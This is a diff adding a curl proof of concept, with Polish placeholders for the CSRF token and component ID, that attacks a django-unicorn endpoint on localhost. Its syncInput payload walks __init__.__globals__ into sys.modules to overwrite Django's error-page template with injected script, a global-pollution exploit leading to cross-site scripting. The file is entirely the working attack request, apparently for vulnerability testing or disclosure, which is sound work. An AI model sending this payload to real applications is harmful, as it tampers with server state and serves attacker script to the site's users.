@@ -1,0 +1,25 @@
+curl -X POST http://localhost:8000/unicorn/message/profile_card/ \
+  -H "Content-Type: application/json" \
+  -H "X-CSRFToken: TUTAJ_WSTAW_TOKEN" \
+  -H "Cookie: csrftoken=TUTAJ_WSTAW_TOKEN" \
+  -d '{
+    "id": "TUTAJ WSTAW ID KOMPONENTU POBRANEGO ZE STRONY INTERNETOWEJ",
+    "actionQueue": [
+      {
+        "type": "syncInput",
+        "payload": {
+          "name": "__init__.__globals__.sys.modules.django.views.defaults.ERROR_PAGE_TEMPLATE",
+          "value": "<html><script>alert(\'error page pollution\')</script></html>"
+        }
+      }
+    ],
+    "data": {
+      "name": "Jan",
+      "role": "User"
+    },
+    "epoch": "123",
+    "checksum": "G38efjJS"
+  }'
+
+
+
